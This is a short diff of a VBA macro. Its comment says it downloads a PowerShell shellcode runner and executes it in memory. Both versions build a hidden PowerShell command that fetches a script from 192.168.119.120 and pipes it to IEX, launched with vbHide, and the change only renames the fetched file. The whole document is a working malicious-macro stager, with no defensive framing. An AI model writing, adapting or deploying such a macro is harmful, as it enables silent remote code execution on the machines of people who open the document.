@@ -1,8 +1,8 @@
-//VBA code to download ps shellcode runner & execute in memory 
+//VBA code to download ps shellcode runner (runner.ps1) & execute in memory 
 
 Sub MyMacro()
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/runner.ps1') | IEX"
     Shell str, vbHide
 End Sub
 
